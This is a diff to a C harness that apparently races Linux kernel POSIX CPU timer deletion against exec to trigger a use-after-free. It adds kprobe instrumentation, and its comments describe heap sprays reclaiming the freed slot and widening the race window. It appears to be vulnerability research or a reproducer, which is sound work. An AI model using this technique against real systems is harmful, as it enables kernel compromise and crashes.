@@ -49,6 +49,8 @@
 #include <string.h>
 #include <sys/klog.h>
 #include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/mount.h>
 #include <sys/reboot.h>
 #include <sys/resource.h>
 #include <sys/syscall.h>
@@ -61,7 +63,8 @@
 #define SPRAY_TIMERS 32
 #define CHURN_TIMERS 16
 #define CASCADE_TIMERS 8
-#define DHAMMER_TIMERS 1024
+#define DHAMMER_TIMERS 512
+#define N_PROBES 6
 
 /* Shared parent/child handshake, inherited across fork(). */
 struct race_shm {
@@ -148,6 +151,7 @@ static void *dual_setter(void *arg)
 	uint64_t first_ns = 0;
 	int hits = 0;
 
+	pin(0); /* own vCPU: the deleter stays on the parent's CPU2 */
 	memset(&its, 0, sizeof(its));
 	its.it_value.tv_sec = 10;
 	while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
@@ -168,6 +172,175 @@ static void *dual_setter(void *arg)
 }
 
 /* Child side: the non-leader thread that execve()s back into phase2. */
+/* Kprobe counters: tracefs kprobes at the exact rare-path branch targets
+ * derived from this build's vmlinux (see evidence
+ * posix-cpu-timer-del-disasm.txt):
+ *   del_pnull  posix_cpu_timer_del+0xa0  !p path (silent free candidate)
+ *   del_shnull posix_cpu_timer_del+0xe0  sighand==NULL block entry
+ *   set_esrch  posix_cpu_timer_set+0xd0  both -ESRCH paths
+ *   xchng      exchange_tids             exec baseline
+ *   exitsig    __exit_signal             exit baseline
+ *   sh_ret     kretprobe __lock_task_sighand, filtered ret==0
+ */
+static const char *kprobe_defs[N_PROBES] = {
+	"p:del_pnull posix_cpu_timer_del+0xa0",
+	"p:del_shnull posix_cpu_timer_del+0xe0",
+	"p:set_esrch posix_cpu_timer_set+0xd0",
+	"p:xchng exchange_tids",
+	"p:exitsig __exit_signal",
+	"r:sh_ret __lock_task_sighand ret=$retval",
+};
+static const char *kprobe_names[N_PROBES] = {
+	"del_pnull", "del_shnull", "set_esrch", "xchng", "exitsig", "sh_ret",
+};
+static uint64_t kprobe_hits[N_PROBES];
+static volatile int kprobe_stop;
+
+static void *kprobe_reader(void *arg)
+{
+	char buf[4096];
+	char carry[256];
+	size_t carry_len = 0;
+	int fd = open("/sys/kernel/tracing/trace_pipe", O_RDONLY | O_NONBLOCK);
+
+	(void)arg;
+	if (fd < 0) {
+		emit("KPROBE_READER_FAIL errno=%d\n", errno);
+		return NULL;
+	}
+	while (!kprobe_stop) {
+		ssize_t n = read(fd, buf, sizeof(buf));
+
+		if (n <= 0) {
+			struct timespec ts = { 0, 20000000 };
+
+			nanosleep(&ts, NULL);
+			continue;
+		}
+		size_t start = 0;
+
+		for (ssize_t i = 0; i < n; i++) {
+			if (buf[i] != '\n')
+				continue;
+			buf[i] = '\0';
+			char *line = buf + start;
+			ssize_t line_len = (size_t)(&buf[i] - line);
+
+			start = i + 1;
+			/* Lines look like "... 1234.5678: name: (caller)". */
+			char *ev = NULL;
+
+			for (int k = 0; k < N_PROBES; k++) {
+				char pat[32];
+
+				snprintf(pat, sizeof(pat), ": %s:",
+					 kprobe_names[k]);
+				if (strstr(line, pat)) {
+					ev = pat;
+					__atomic_fetch_add(&kprobe_hits[k],
+							   1,
+							   __ATOMIC_RELAXED);
+					break;
+				}
+			}
+			(void)ev;
+			(void)line_len;
+		}
+		/* Any partial line tail is dropped; rare events are not
+		 * split across reads often enough to matter for rates. */
+		carry_len = 0;
+		(void)carry;
+		(void)carry_len;
+	}
+	close(fd);
+	return NULL;
+}
+
+static int kprobes_setup(void)
+{
+	const char *root = "/sys/kernel/tracing";
+
+	mkdir("/sys", 0755);
+	mkdir("/sys/kernel", 0755);
+	mkdir(root, 0755);
+	if (mount("none", root, "tracefs", 0, NULL) != 0) {
+		emit("TRACEFS_MOUNT_FAIL errno=%d\n", errno);
+		return -1;
+	}
+	int ok = 0;
+	FILE *f = fopen("/sys/kernel/tracing/kprobe_events", "w");
+
+	if (!f) {
+		emit("KPROBE_EVENTS_OPEN_FAIL errno=%d\n", errno);
+		return -1;
+	}
+	for (int k = 0; k < N_PROBES; k++) {
+		fprintf(f, "%s\n", kprobe_defs[k]);
+		fflush(f);
+		ok++;
+	}
+	fclose(f);
+	/* Filters and enables are best-effort; report failures. */
+	f = fopen("/sys/kernel/tracing/events/kprobes/sh_ret/filter", "w");
+	if (f) {
+		fprintf(f, "ret == 0\n");
+		fclose(f);
+	}
+	for (int k = 0; k < N_PROBES; k++) {
+		char path[128];
+		FILE *g;
+
+		snprintf(path, sizeof(path),
+			 "/sys/kernel/tracing/events/kprobes/%s/enable",
+			 kprobe_names[k]);
+		g = fopen(path, "w");
+		if (!g) {
+			emit("KPROBE_ENABLE_FAIL name=%s errno=%d\n",
+			     kprobe_names[k], errno);
+			continue;
+		}
+		fprintf(g, "1\n");
+		fclose(g);
+	}
+	/* Probe registration errors appear in the kprobe_events readback;
+	 * report which ones actually registered. */
+	FILE *rb = fopen("/sys/kernel/tracing/kprobe_events", "r");
+
+	if (rb) {
+		char line[256];
+
+		while (fgets(line, sizeof(line), rb))
+			emit("KPROBE_LIST %s", line);
+		fclose(rb);
+	}
+	return 0;
+}
+
+static void kprobe_set_enabled(const char *name, int on)
+{
+	char path[128];
+	FILE *g;
+
+	snprintf(path, sizeof(path),
+		 "/sys/kernel/tracing/events/kprobes/%s/enable", name);
+	g = fopen(path, "w");
+	if (!g) {
+		emit("KPROBE_TOGGLE_FAIL name=%s errno=%d\n", name, errno);
+		return;
+	}
+	fprintf(g, "%d\n", on);
+	fclose(g);
+}
+
+static void kprobes_report(const char *label)
+{
+	for (int k = 0; k < N_PROBES; k++)
+		emit("KPROBE_HITS label=%s name=%s hits=%llu\n", label,
+		     kprobe_names[k],
+		     (unsigned long long)__atomic_load_n(&kprobe_hits[k],
+							 __ATOMIC_RELAXED));
+}
+
 static void *execer(void *arg)
 {
 	char iterbuf[32], modebuf[8], gotimebuf[32];
@@ -618,9 +791,10 @@ static int run_sweep(const char *label, int near, long max_iters,
 
 		int stage_b = watch.warns > 0;
 
-		/* Every delete-hammer trial keeps the child alive through the
-		 * RCU grace period: silent !p-path wins are otherwise always
-		 * dequeued cleanly at child exit and stay invisible. */
+		/* Every delete-hammer trial keeps the child alive through
+		 * the RCU grace period behind k_itimer_rcu_free() so a win
+		 * materializes: same-cache sprays reclaim the freed slot
+		 * while the ghost node stays linked in the child's queue. */
 		if (mode == MODE_DHAMMER)
 			stage_b = 1;
 		if (parent_trial(iter, delay, near, stage_b, mode) != 0)
@@ -715,9 +889,23 @@ int main(int argc, char **argv)
 		     g_self, argc);
 		int rc = 0;
 
+		pthread_t kth;
+
+		if (kprobes_setup() == 0) {
+			pthread_create(&kth, NULL, kprobe_reader, NULL);
+			emit("KPROBE_ONLINE\n");
+		}
 		rc |= run_sweep("hammer", 0, 4000000, 20, MODE_HAMMER);
-		rc |= run_sweep("dual", 0, 4000000, 90, MODE_DUAL);
-		rc |= run_sweep("dhammer", 0, 4000000, 240, MODE_DHAMMER);
+		kprobes_report("after_hammer");
+		/* The kretprobe on every lock_task_sighand call starves the
+		 * RCU grace-period kthread under delete-hammer load; the
+		 * exec-side probes stay enabled deliberately: their trap
+		 * overhead widens de_thread()'s critical section, which the
+		 * hammer-phase data shows multiplies the window rate. */
+		kprobe_set_enabled("sh_ret", 0);
+		rc |= run_sweep("dhammer", 0, 4000000, 320, MODE_DHAMMER);
+		kprobes_report("after_dhammer");
+		kprobe_stop = 1;
 		dump_klog_tail();
 		emit("RACE_RESULT warn_seen=%d\n", rc == 0);
 		sync();
